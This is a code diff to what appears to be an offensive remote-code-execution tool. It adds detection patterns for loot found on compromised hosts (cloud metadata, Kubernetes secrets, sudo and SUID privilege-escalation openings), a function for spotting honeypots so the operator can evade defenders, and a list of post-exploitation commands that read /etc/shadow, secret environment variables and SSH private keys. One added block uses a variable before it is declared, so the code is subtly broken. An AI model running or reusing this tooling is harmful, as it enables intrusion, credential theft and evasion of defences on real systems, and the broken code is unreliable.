@@ -93,6 +93,29 @@ const RCE_PATTERNS: Pattern[] = [
   { re: /^USERPROFILE=C:\\Users\\/m,                                          name: "userprofile", hi: true,  ctx: 10 },
   // Specific Linux tool paths in env output
   { re: /\/usr\/bin\/(?:perl|python3?|ruby|node|php)\b/,                     name: "tool-path",   hi: false, ctx: 10 },
+  // Cloud instance metadata — AWS IMDSv2 / GCP / Azure
+  { re: /"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"/,                             name: "aws-imds",    hi: true,  ctx: 15 },
+  { re: /ami-[0-9a-f]{8,17}/,                                                   name: "aws-ami",     hi: true,  ctx: 5  },
+  { re: /"computeName"\s*:\s*"[^"]{2,80}"/,                                   name: "azure-imds",  hi: true,  ctx: 10 },
+  { re: /projects\/\d{10,20}\/zones\/[a-z]+-[a-z]+-\d/,                    name: "gcp-imds",    hi: true,  ctx: 10 },
+  // Container / Kubernetes indicators
+  { re: /container_id=[0-9a-f]{12,64}/,                                          name: "cgroup-id",   hi: true,  ctx: 5  },
+  { re: /KUBERNETES_SERVICE_HOST=\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,    name: "k8s-env",     hi: true,  ctx: 10 },
+  { re: /\/var\/run\/secrets\/kubernetes\.io/,                               name: "k8s-secret",  hi: true,  ctx: 5  },
+  { re: /\/proc\/1\/cgroup.*docker/i,                                          name: "docker-cg",   hi: true,  ctx: 5  },
+  // Cron / persistence markers
+  { re: /^(\*|[0-9, *-]+)\s+(\*|[0-9, *-]+)\s+(\*|[0-9, *-]+)\s+/m,      name: "cron",        hi: false, ctx: 5  },
+  // Network info
+  { re: /\barp\b.*\binet\b|\bHWaddr\s+([0-9a-fA-F:]{17})/,               name: "arp",         hi: false, ctx: 8  },
+  { re: /^(eth|ens|enp|wlan|lo)\d*\s+/m,                                      name: "iface",       hi: false, ctx: 5  },
+  // sudo -l output
+  { re: /\(ALL\s*:\s*ALL\)\s*NOPASSWD/,                                     name: "sudo-nopass", hi: true,  ctx: 8  },
+  { re: /User\s+\w+\s+may run the following/,                                  name: "sudo-l",      hi: true,  ctx: 15 },
+  // SUID binaries
+  { re: /SUID.*(?:\/usr\/bin|\/bin)\/\w+/i,                                 name: "suid",        hi: true,  ctx: 8  },
+  // Windows privesc
+  { re: /SeImpersonatePrivilege\s+\w+\s+Enabled/i,                            name: "se-imperson", hi: true,  ctx: 8  },
+  { re: /SeDebugPrivilege\s+\w+\s+Enabled/i,                                   name: "se-debug",    hi: true,  ctx: 8  },
 ];
 
 /* Raw-body patterns — test against un-stripped HTML for output
@@ -133,6 +156,21 @@ export function extractCommandOutput(
   body:          string,
   baselineBody?: string,
 ): ExtractionResult | null {
+
+
+  /* ── 0. NEXUS_SUCCESS — explicit success sentinel (highest priority) ── */
+  const successIdx = plain.indexOf(NEXUS_SUCCESS);
+  if (successIdx !== -1) {
+    const before = plain.slice(0, successIdx).trim();
+    const lines  = before.split("\n").filter(l => l.trim().length > 0);
+    if (lines.length > 0) {
+      return {
+        text:       lines.slice(-80).join("\n").trim().slice(0, 4096),
+        method:     "nexus-success",
+        confidence: "high",
+      };
+    }
+  }
 
   /* ── 1. Marker-based (works on any content-type) ─────────── */
   const plain = stripHtml(body);
@@ -398,3 +436,47 @@ export function extractFromSseBody(body: string): ExtractionResult | null {
   }
   return null;
 }
+
+
+/* ── Honeypot / sandbox detection hint ──────────────────────────────────────
+   Heuristic: honeypots often return VERY clean "perfect" command output
+   with no side content, or return identical responses to every request.
+   Not a definitive check — just a flag to surface in the UI.            */
+export function detectHoneypotHint(
+  body:         string,
+  baselineBody: string,
+  status:       number,
+): { likelyHoneypot: boolean; reason: string } {
+  // Exact same body as baseline despite different payload = possible deception
+  if (baselineBody.length > 100 && body === baselineBody) {
+    return { likelyHoneypot: true, reason: "Response identical to baseline despite different payload" };
+  }
+  // Suspiciously fast + perfect uid=0 response on port 80
+  if (status === 200 && /uid=0\(root\)/.test(body) && body.length < 50) {
+    return { likelyHoneypot: true, reason: "Suspiciously clean root output — possible honeypot" };
+  }
+  // Common honeypot framework signatures
+  if (/honeypot|canary|canarytokens|opencanary/i.test(body)) {
+    return { likelyHoneypot: true, reason: "Honeypot signature in response body" };
+  }
+  // Error pages that look like successful injections (common in Cowrie etc.)
+  if (/\broot@\w+:/i.test(body) && body.length < 200 && status !== 200) {
+    return { likelyHoneypot: true, reason: "Shell prompt in error response — possible Cowrie/Dionaea" };
+  }
+  return { likelyHoneypot: false, reason: "" };
+}
+
+/* ── Privilege escalation quick-check payloads ───────────────────────────────
+   Run these after RCE is confirmed to enumerate privesc opportunities.   */
+export const PRIVESC_CHECKS = [
+  "sudo -l 2>/dev/null",
+  "find / -perm -4000 -type f 2>/dev/null | head -20",
+  "cat /etc/crontab 2>/dev/null && ls /etc/cron.d/ 2>/dev/null",
+  "env 2>/dev/null | grep -i 'secret\|pass\|key\|token\|api' | head -10",
+  "cat /proc/1/cgroup 2>/dev/null | head -3",  // detect container
+  "id && cat /proc/net/fib_trie 2>/dev/null | grep 'LOCAL\|UNICAST' | awk '{print $1}' | sort -u | head -10",
+  "uname -r && cat /etc/issue 2>/dev/null && lsb_release -a 2>/dev/null",
+  "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20",
+  "ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null",
+  "cat /root/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null | head -5",
+];
